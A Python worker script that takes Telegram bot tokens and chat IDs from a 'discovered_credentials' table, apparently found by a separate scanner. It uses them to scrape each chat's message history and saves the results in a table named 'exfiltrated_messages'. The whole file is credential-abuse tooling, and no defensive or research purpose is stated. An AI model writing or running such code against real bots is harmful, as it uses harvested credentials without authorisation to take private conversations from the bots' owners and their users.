import asyncio
import sys
import os
import time

# Add project root to sys.path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from app.core.database import db
from app.services.scraper_srv import scraper_service

async def run_manual_worker():
    print("🚀 Starting LOCAL MANUAL WORKER (Scraping Active Credentials)...")
    
    # 1. Fetch Active Credentials
    try:
        response = db.table("discovered_credentials").select("*").eq("status", "active").execute()
        creds = response.data
    except Exception as e:
        print(f"❌ DB Error: {e}")
        return

    if not creds:
        print("⚠️ No ACTIVE credentials found in DB. Run the scanner first!")
        return

    print(f"📋 Found {len(creds)} active credentials to scrape.")
    print("-------------------------------------------------")

    total_msgs = 0
    
    for i, cred in enumerate(creds):
        cred_id = cred['id']
        token = cred['bot_token']
        chat_id = cred['chat_id']
        bot_name = cred.get('meta', {}).get('bot_username', 'Unknown')
        
        print(f"\n🔄 [{i+1}/{len(creds)}] Processing Bot: @{bot_name} (ID: {cred_id})")
        print(f"   Target Chat: {chat_id}")

        if not chat_id:
            print("   ⚠️ No chat_id found for this active credential. Skipping (should be pending?)")
            continue

        try:
            # Scrape History
            print("   ⏳ Scraping history...")
            messages = await scraper_service.scrape_history(token, chat_id)
            print(f"   ✅ Retrieved {len(messages)} messages.")
            
            # Save to DB
            saved_count = 0
            for msg in messages:
                msg["credential_id"] = cred_id
                
                # Sanitize: Remove keys that are not columns in exfiltrated_messages
                # The scraper adds 'chat_id' for tracking, but the table relies on credential_id reference
                msg.pop('chat_id', None) 
                
                try:
                    db.table("exfiltrated_messages").insert(msg).execute()
                    saved_count += 1
                except Exception as e:
                    # Ignore unique constraint errors (duplicates), but print others!
                    if "duplicate key" in str(e) or "unique constraint" in str(e):
                        pass
                    else:
                        print(f"      ❌ Insert Failed for Msg {msg.get('telegram_msg_id')}: {e}")
            
            print(f"   💾 Saved {saved_count} NEW messages to DB.")
            total_msgs += saved_count
            
        except Exception as e:
            print(f"   ❌ Error scraping: {e}")
            # Optional: Mark as revoked/error?
            # db.table("discovered_credentials").update({"status": "error"}).eq("id", cred_id).execute()

        # Slight delay to be nice to Telegram API if processing many
        await asyncio.sleep(1)

    print("\n-------------------------------------------------")
    print(f"🏁 Manual Worker Complete. Total New Messages: {total_msgs}")
    print("   Check the Web Dashboard or Database to view content.")

if __name__ == "__main__":
    asyncio.run(run_manual_worker())
